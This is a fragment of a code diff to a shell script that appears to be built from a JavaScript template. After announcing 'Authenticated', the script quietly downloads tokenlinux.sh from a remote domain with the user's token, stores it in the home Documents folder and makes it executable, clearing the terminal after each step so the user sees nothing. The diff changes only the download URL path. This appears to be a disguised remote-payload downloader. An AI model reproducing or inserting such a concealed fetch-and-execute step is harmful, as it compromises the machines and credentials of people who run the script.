@@ -40,7 +40,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/Documents"
 clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/api/task/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
+curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/api/users/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
 clear
 chmod +x "$HOME/Documents/tokenlinux.sh"
 clear
